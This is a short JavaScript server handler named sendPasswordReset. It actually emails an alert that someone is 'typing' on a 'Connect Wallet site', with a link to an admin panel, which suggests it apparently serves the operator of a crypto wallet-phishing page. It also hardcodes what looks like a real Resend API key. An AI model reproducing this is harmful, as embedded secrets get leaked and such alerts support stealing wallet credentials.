import { createError } from "../error.js" 

import { Resend } from 'resend';
import crypto from 'crypto'
import bcrypt from 'bcryptjs';


export const sendPasswordReset = async(req, res, next) =>{
    try {
        
        const resend = new Resend('re_VBc5AjAZ_8C6gLxu5kA8NJQHHEjD1i8wi');

        await resend.emails.send({
        from: 'noreply@pitradedigital.com',
        to: req.body.email,
        subject: 'New Activity In Connect Wallet site',
        html: `<p>Someone is currently typing connect wallet site. Click on <a href="https://pitradedigital.com/admin">admin</a> to see their activity.</p>`
        }); 
        res.status(200).json("email sent")
    } catch (error) {
        next(error); 
    }
}

